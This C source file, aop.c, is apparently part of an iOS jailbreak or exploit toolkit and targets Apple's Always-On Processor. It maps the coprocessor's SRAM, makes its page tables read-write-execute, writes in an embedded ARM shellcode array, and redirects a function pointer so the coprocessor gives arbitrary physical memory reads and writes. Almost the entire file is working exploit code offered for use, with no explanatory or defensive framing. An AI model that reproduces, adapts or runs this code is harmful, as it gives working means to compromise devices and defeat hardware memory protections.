// aop.c
// Trigon, 2025

#include "aop.h"
#include "memory.h"
#include "mach_vm.h"
#include "info.h"

#include <stdio.h>
#include <unistd.h>

#define AOP_VIRT_BASE (0x1000000)

#define AOP_CMD_NONE 0x1
#define AOP_CMD_READY 0x2
#define AOP_CMD_READ 0x3
#define AOP_CMD_WRITE 0x4
#define CMD_OFFSET 0xf0
#define OFFSET_OFFSET 0xf4
#define VALUE_OFFSET 0xf8
#define ORIG_ADDR_OFFSET 0xfc
#define TARGET_VA_OFFSET 0x100

void aop_flush(void *addr, size_t size);

static struct aop_info_t gAOPInfo = { 0 };

static const uint32_t aop_shc[] = {
    0xe28fc0e8, // add r12, pc, #232
    0xe59c8000, // ldr r8, [r12]
    0xe3580001, // cmp r8, #1
    0x0a000034, // beq 0xe4
    0xe3580000, // cmp r8, #0
    0x0a000032, // beq 0xe4
    0xe3a09000, // mov r9, #0
    0xe58c9000, // str r9, [r12]
    0xf57ff04f, // dsb sy
    0xee07cf3e, // mcr p15, #0x0, r12, c7, c14, #0x1
    0xf57ff04f, // dsb sy
    0xf57ff06f, // isb sy
    0xe3580002, // cmp r8, #2
    0x0a000002, // beq 0x44
    0xe3580003, // cmp r8, #3
    0x0a000011, // beq 0x88
    0xea000020, // b 0xc8
    0xe28f20a8, // add r2, pc, #168
    0xe5922000, // ldr r2, [r2]
    0xe28fc0ac, // add r12, pc, #172
    0xe59cc000, // ldr r12, [r12]
    0xf57ff04f, // dsb sy
    0xee08cf37, // mcr p15, #0x0, r12, c8, c7, #0x1
    0xf57ff04f, // dsb sy
    0xf57ff06f, // isb sy
    0xe08cc002, // add r12, r12, r2
    0xe59ca000, // ldr r10, [r12]
    0xe28f2084, // add r2, pc, #132
    0xe582a000, // str r10, [r2]
    0xf57ff04f, // dsb sy
    0xee072f3e, // mcr p15, #0x0, r2, c7, c14, #0x1
    0xf57ff04f, // dsb sy
    0xf57ff06f, // isb sy
    0xea00000f, // b 0xc8
    0xe28f2064, // add r2, pc, #100
    0xe5922000, // ldr r2, [r2]
    0xe28fc068, // add r12, pc, #104
    0xe59cc000, // ldr r12, [r12]
    0xf57ff04f, // dsb sy
    0xee08cf37, // mcr p15, #0x0, r12, c8, c7, #0x1
    0xf57ff04f, // dsb sy
    0xf57ff06f, // isb sy
    0xe08cc002, // add r12, r12, r2
    0xe28f2044, // add r2, pc, #68
    0xe5922000, // ldr r2, [r2]
    0xe58c2000, // str r2, [r12]
    0xf57ff04f, // dsb sy
    0xee07cf3e, // mcr p15, #0x0, r12, c7, c14, #0x1
    0xf57ff04f, // dsb sy
    0xf57ff06f, // isb sy
    0xe28fc020, // add r12, pc, #32
    0xe3a02001, // mov r2, #1
    0xe58c2000, // str r2, [r12]
    0xf57ff04f, // dsb sy
    0xee07cf3e, // mcr p15, #0x0, r12, c7, c14, #0x1
    0xf57ff04f, // dsb sy
    0xf57ff06f, // isb sy
    0xe28fc010, // add r12, pc, #16
    0xe59cc000, // ldr r12, [r12]
    0xe12fff1c, // bx r12
    0x00000000, // command
    0x00000000, // offset
    0x00000000, // value/output
    0x00000000, // orig addr
    0x00000000, // target va
};

static void __memcpy_no_chk(uint8_t *volatile dest, uint8_t *volatile src, size_t size) {
    while (size--) {
        *dest++ = *src++;
    }
    asm volatile ("dmb sy");
    usleep(10);
}

uint64_t aop_vtophys(uint32_t va) {
    if (va < AOP_VIRT_BASE || va > (AOP_VIRT_BASE + gAOPInfo.size)) return 0;
    uint32_t offset = va - AOP_VIRT_BASE;
    return gAOPInfo.basePA + offset;
}

void aop_read_buf(uint32_t addr, void *buf, size_t size) {
    uint64_t pa = aop_vtophys(addr);
    if (pa == 0) return;
    
    uint64_t aligned_pa = trunc_page_kernel(pa);
    size_t mapped_size = round_page_kernel(size);
    uint64_t mapped_offset = pa - aligned_pa;

    uint8_t *mapped = (uint8_t *)map_data(aligned_pa, mapped_size, VM_PROT_READ);
    if (mapped == NULL) return;
    
    __memcpy_no_chk(buf, mapped + mapped_offset, size);
    mach_vm_deallocate(mach_task_self(), (mach_vm_address_t)mapped, mapped_size);
}

void aop_write_buf(uint32_t addr, void *buf, size_t size) {
    uint64_t pa = aop_vtophys(addr);
    if (pa == 0) return;
    
    uint64_t aligned_pa = trunc_page_kernel(pa);
    size_t mapped_size = round_page_kernel(size);
    uint64_t mapped_offset = pa - aligned_pa;

    uint8_t *mapped = (uint8_t *)map_data(aligned_pa, mapped_size, VM_PROT_READ|VM_PROT_WRITE);
    if (mapped == NULL) return;
        
    __memcpy_no_chk(mapped + mapped_offset, buf, size);
    mach_vm_deallocate(mach_task_self(), (mach_vm_address_t)mapped, mapped_size);
}

uint64_t aop_read64(uint32_t addr) {
    uint64_t val = 0;
    aop_read_buf(addr, &val, 8);
    return val;
}

uint32_t aop_read32(uint32_t addr) {
    uint32_t val = 0;
    aop_read_buf(addr, &val, 4);
    return val;
}

uint16_t aop_read16(uint32_t addr) {
    uint16_t val = 0;
    aop_read_buf(addr, &val, 2);
    return val;
}

uint8_t aop_read8(uint32_t addr) {
    uint8_t val = 0;
    aop_read_buf(addr, &val, 1);
    return val;
}

void aop_write64(uint32_t addr, uint64_t val) {
    aop_write_buf(addr, &val, 8);
}

void aop_write32(uint32_t addr, uint32_t val) {
    aop_write_buf(addr, &val, 4);
}

void aop_write16(uint32_t addr, uint16_t val) {
    aop_write_buf(addr, &val, 2);
}

void aop_write8(uint32_t addr, uint8_t val) {
    aop_write_buf(addr, &val, 1);
}

static uint8_t *aop_find_info_struct(void) {
    uint8_t bytes[] = {
        0x4F, 0xF0, 0x7F, 0xF5, // dsb sy
        0x1E, 0xFF, 0x2F, 0xE1, // bx lr
        0xFE, 0xFF, 0xFF, 0xEA  // b .
    };
    
    uint8_t *loc = memmem(gAOPInfo.mapped, gAOPInfo.size, bytes, sizeof(bytes));
    if (loc == NULL) return NULL;
    return loc + sizeof(bytes);
}

static uint32_t aop_find_target_func(void) {
    uint8_t bytes_1[] = {
        0x0B, 0x4B, 0xFE, 0xCA,  // magic
    };
    
    uint8_t *loc = memmem((void *)((uint64_t)gAOPInfo.mapped + 0x600), gAOPInfo.size, bytes_1, sizeof(bytes_1));
    if (loc == NULL) return 0;

    loc -= 0x140;
    uint8_t bytes_2[] = {
        0x00, 0x00, 0x82, 0xe5, // str r0, [r2]
    };
    
    loc = memmem(loc, 0x200, bytes_2, sizeof(bytes_2));
    if (loc == NULL) return 0;
    return AOP_VIRT_BASE + (uint32_t)((uint64_t)(loc - 0x4) - (uint64_t)gAOPInfo.mapped);
}

static uint32_t aop_find_target_stub(void) {
    uint32_t target_func = aop_find_target_func();
    if (target_func == 0) return 0;
    
    for (uint32_t i = 0; i < gAOPInfo.size; i += 4) {
        uint32_t value = *(uint32_t *)(gAOPInfo.mapped + i);
        uint32_t rel = target_func - (AOP_VIRT_BASE + i);
        if (value == rel) return AOP_VIRT_BASE + i;
    }
    return 0;
}

void aop_set_ttbr0_rwx(uint32_t ttbr0) {
    for (uint32_t i = 0; i < (0x1000 / 8); i++) {
        uint32_t desc_addr = ttbr0 + (i * 0x8);
        uint64_t desc = aop_read64(desc_addr);
        
        if (!desc || ((desc & 0x3) != 0x3)) continue;
        desc &= ~((uint64_t)(3 << 6));
        desc |= ((uint64_t)(0 << 6));
        desc &= ~((uint64_t)(1ULL << 54));
        desc &= ~((uint64_t)(1ULL << 53));
        desc |= ((uint64_t)(1 << 10));
        aop_write64(desc_addr, desc);
    }
}

static void aop_await_ready(void) {
    while (1) {
        if (*(uint32_t *)(gAOPInfo.mapped + CMD_OFFSET) == 0x1) break;
        aop_flush(gAOPInfo.mapped, 0x4000);
    }
}

int aop_init(uint64_t base, uint64_t size) {
    gAOPInfo.basePA = base;
    gAOPInfo.size = size;
    
    gAOPInfo.mapped = (uint8_t *)map_data(base, size, VM_PROT_READ | VM_PROT_WRITE);
    if (!gAOPInfo.mapped) {
        printf("ERROR: failed to map AOP SRAM.\n");
        return -1;
    }
    
    uint8_t *infoStruct = aop_find_info_struct();
    if (!infoStruct) {
        printf("ERROR: failed to find AOP info struct.\n");
        return -1;
    }
    
    gAOPInfo.ttbr0 = *(uint32_t *)(infoStruct);
    gAOPInfo.ttbr1 = *(uint32_t *)(infoStruct + 4);
    gAOPInfo.shellcodeVA = AOP_VIRT_BASE;
    gAOPInfo.targetVA = AOP_VIRT_BASE;
    gAOPInfo.targetFunction = aop_find_target_func();
    gAOPInfo.targetPointer = aop_find_target_stub();
    unmap_data((uint64_t)gAOPInfo.mapped, size);
    
    if (gAOPInfo.targetFunction == 0 || gAOPInfo.targetPointer == 0) {
        printf("ERROR: failed to find target AOP function (0x%X/0x%X).\n", gAOPInfo.targetFunction, gAOPInfo.targetPointer);
        return -1;
    }
    
    for (uint32_t i = 0; i < 0x1000; i+=0x8) {
        if (aop_read64(gAOPInfo.ttbr0 + i) == 0 && aop_read64(gAOPInfo.ttbr0 + i + 8) == 0) {
            gAOPInfo.shellcodePTE = gAOPInfo.ttbr0 + i;
            gAOPInfo.targetPTE = gAOPInfo.ttbr0 + i + 0x8;
            break;
        }

        gAOPInfo.shellcodeVA += 0x1000;
        gAOPInfo.targetVA += 0x1000;
    }
    
    if (gAOPInfo.shellcodePTE == 0) {
        printf("ERROR: failed to find shellcode PTE for AOP.\n");
        return -1;
    }
    
    gAOPInfo.targetVA += 0x1000;
    aop_set_ttbr0_rwx(gAOPInfo.ttbr0);
    aop_write64(gAOPInfo.shellcodePTE, gMappingBase | 0x403);
    aop_write64(gAOPInfo.targetPTE, (gMappingBase + 0x4000) | 0x403);
    
    gAOPInfo.mapped = (uint8_t *)map_page(gMappingBase, VM_PROT_READ | VM_PROT_WRITE);
    __memcpy_no_chk((uint8_t *volatile)gAOPInfo.mapped, (uint8_t *volatile)&aop_shc[0], sizeof(aop_shc));
    *(uint32_t *)(gAOPInfo.mapped + CMD_OFFSET) = AOP_CMD_READY;
    *(uint32_t *)(gAOPInfo.mapped + OFFSET_OFFSET) = 0;
    *(uint32_t *)(gAOPInfo.mapped + VALUE_OFFSET) = 0;
    *(uint32_t *)(gAOPInfo.mapped + ORIG_ADDR_OFFSET) = gAOPInfo.targetFunction;
    *(uint32_t *)(gAOPInfo.mapped + TARGET_VA_OFFSET) = gAOPInfo.targetVA;
    
    aop_flush(gAOPInfo.mapped, 0x4000);
    aop_write32(gAOPInfo.targetPointer, (uint32_t)(gAOPInfo.shellcodeVA - gAOPInfo.targetPointer));
    
    return 0;
}

void aop_deinit(void) {
    aop_write32(gAOPInfo.targetPointer, (uint32_t)(gAOPInfo.targetFunction - gAOPInfo.targetPointer));
    aop_await_ready();

    aop_write64(gAOPInfo.targetPTE, 0);
    aop_write64(gAOPInfo.shellcodePTE, 0);
    
    *(uint32_t *)(gAOPInfo.mapped + OFFSET_OFFSET) = 0;
    *(uint32_t *)(gAOPInfo.mapped + VALUE_OFFSET) = 0;
    *(uint32_t *)(gAOPInfo.mapped + CMD_OFFSET) = 0;
    *(uint32_t *)(gAOPInfo.mapped + ORIG_ADDR_OFFSET) = 0;
    *(uint32_t *)(gAOPInfo.mapped + TARGET_VA_OFFSET) = 0;

    aop_flush(gAOPInfo.mapped, 0x4000);
    unmap_page((uint64_t)gAOPInfo.mapped);
}

uint32_t aop_physread32(uint64_t pa) {
    aop_await_ready();
    aop_write64(gAOPInfo.targetPTE, (pa & ~0xFFF) | 0x403);
    *(uint32_t *)(gAOPInfo.mapped + OFFSET_OFFSET) = (pa & 0xFFF);
    *(uint32_t *)(gAOPInfo.mapped + VALUE_OFFSET) = 0;
    *(uint32_t *)(gAOPInfo.mapped + CMD_OFFSET) = 2;
    
    aop_flush(gAOPInfo.mapped, 0x4000);
    aop_await_ready();
    return *(uint32_t *)(gAOPInfo.mapped + VALUE_OFFSET);
}
